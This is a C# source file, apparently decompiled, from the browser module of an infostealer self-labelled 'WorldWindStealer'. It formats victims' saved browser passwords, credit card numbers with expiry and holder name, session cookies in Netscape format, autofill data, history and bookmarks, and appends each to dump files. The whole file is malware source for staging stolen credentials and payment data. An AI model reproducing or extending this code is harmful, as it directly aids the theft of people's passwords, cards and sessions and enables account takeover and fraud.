using System.Collections.Generic;
using System.IO;
using Client.Modules.Passwords.Helpers;

namespace Client.Modules.Passwords.Targets.Browsers;

internal sealed class cBrowserUtils
{
	private static string FormatPassword(Password pPassword)
	{
		return $"Url: {pPassword.sUrl}\nUsername: {pPassword.sUsername}\nPassword: {pPassword.sPassword}\nWorldWindStealer\n";
	}

	private static string FormatCreditCard(CreditCard cCard)
	{
		return string.Format("Type: {0}\nNumber: {1}\nExp: {2}\nHolder: {3}\n\n", Banking.DetectCreditCardType(cCard.sNumber), cCard.sNumber, cCard.sExpMonth + "/" + cCard.sExpYear, cCard.sName);
	}

	private static string FormatCookie(Cookie cCookie)
	{
		return $"{cCookie.sHostKey}\tTRUE\t{cCookie.sPath}\tFALSE\t{cCookie.sExpiresUtc}\t{cCookie.sName}\t{cCookie.sValue}\r\n";
	}

	private static string FormatAutoFill(AutoFill aFill)
	{
		return $"{aFill.sName}\t\n{aFill.sValue}\t\n\n";
	}

	private static string FormatHistory(Site sSite)
	{
		return $"### {sSite.sTitle} ### ({sSite.sUrl}) {sSite.iCount}\n";
	}

	private static string FormatBookmark(Bookmark bBookmark)
	{
		if (!string.IsNullOrEmpty(bBookmark.sUrl))
		{
			return $"### {bBookmark.sTitle} ### ({bBookmark.sUrl})\n";
		}
		return $"### {bBookmark.sTitle} ###\n";
	}

	public static bool WriteCookies(List<Cookie> cCookies, string sFile)
	{
		try
		{
			foreach (Cookie cCookie in cCookies)
			{
				File.AppendAllText(sFile, FormatCookie(cCookie));
			}
			return true;
		}
		catch
		{
			return false;
		}
	}

	public static bool WriteAutoFill(List<AutoFill> aFills, string sFile)
	{
		try
		{
			foreach (AutoFill aFill in aFills)
			{
				File.AppendAllText(sFile, FormatAutoFill(aFill));
			}
			return true;
		}
		catch
		{
			return false;
		}
	}

	public static bool WriteHistory(List<Site> sHistory, string sFile)
	{
		try
		{
			foreach (Site item in sHistory)
			{
				File.AppendAllText(sFile, FormatHistory(item));
			}
			return true;
		}
		catch
		{
			return false;
		}
	}

	public static bool WriteBookmarks(List<Bookmark> bBookmarks, string sFile)
	{
		try
		{
			foreach (Bookmark bBookmark in bBookmarks)
			{
				File.AppendAllText(sFile, FormatBookmark(bBookmark));
			}
			return true;
		}
		catch
		{
			return false;
		}
	}

	public static bool WritePasswords(List<Password> pPasswords, string sFile)
	{
		try
		{
			foreach (Password pPassword in pPasswords)
			{
				if (!(pPassword.sUsername == "") && !(pPassword.sPassword == ""))
				{
					File.AppendAllText(sFile, FormatPassword(pPassword));
				}
			}
			return true;
		}
		catch
		{
			return false;
		}
	}

	public static bool WriteCreditCards(List<CreditCard> cCC, string sFile)
	{
		try
		{
			foreach (CreditCard item in cCC)
			{
				File.AppendAllText(sFile, FormatCreditCard(item));
			}
			return true;
		}
		catch
		{
			return false;
		}
	}
}
